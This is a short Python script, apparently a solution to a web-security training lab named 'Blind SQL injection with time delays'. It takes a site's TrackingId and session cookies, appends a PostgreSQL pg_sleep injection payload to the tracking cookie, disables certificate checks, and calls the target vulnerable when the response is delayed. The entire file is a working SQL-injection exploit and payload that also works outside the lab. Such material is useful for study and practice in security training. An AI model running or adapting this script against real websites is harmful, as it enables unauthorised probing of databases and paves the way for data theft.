import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SQL injection with time delays"

def blind_sqli_check(url, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print("[+] Fetching session and tracking ID...")
    r = session.get(url)
    cookies = session.cookies.get_dict()
    tracking_id = cookies.get("TrackingId")
    session_id = cookies.get("session")

    if not tracking_id or not session_id:
        print("[-] Could not retrieve session cookies.")
        return False

    print(f"[+] TrackingId: {tracking_id}")
    print(f"[+] Session: {session_id}")

    # SQL payload that triggers delay
    payload = "' || (SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE NULL END)--"
    full_tracking_id = tracking_id + urllib.parse.quote(payload)

    cookies = {
        "TrackingId": full_tracking_id,
        "session": session_id
    }

    print("[+] Sending request with SQLi payload...")
    try:
        r = session.get(url, cookies=cookies)
        if r.elapsed.total_seconds() > 9:
            print("[+] Vulnerable to time-based blind SQL injection!")
            return True
        else:
            print("[-] Not vulnerable or delay not observed.")
            return False
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False


def run(url, payload=None, proxies=None):
    print("[*] Running blind SQLi time delay check...")
    return blind_sqli_check(url, proxies)
